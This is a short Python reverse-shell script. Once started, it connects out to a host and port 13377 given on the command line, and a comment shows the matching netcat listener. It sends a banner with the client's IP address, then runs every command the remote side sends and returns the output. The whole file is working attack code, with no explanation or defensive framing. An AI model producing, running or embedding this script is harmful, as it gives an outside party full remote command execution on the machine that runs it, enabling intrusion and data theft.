import sys
import socket
import subprocess

we = '''\
  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \\
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
'''

po = 13377  # nc -l -p 13377

if len(sys.argv) < 2:
    print("Please provide the IP address as a command-line argument.")
    sys.exit(1)

ip = sys.argv[1]
client_ip = socket.gethostbyname(socket.gethostname())
we += f"Client IP: {client_ip}\n"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((ip, po))
    print(f"{ip}:{po}")

    sock.sendall(we.encode())

    while True:
        sock.sendall("$ ".encode())
        cmd = sock.recv(po).decode()

        if not cmd:
            break

        cmd = cmd.strip()

        if cmd == 'exit':
            break

        output = subprocess.getoutput(cmd)
        sock.sendall(output.encode())

except ConnectionRefusedError as e:
    print(f"Connection refused: {e}")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    sock.close()
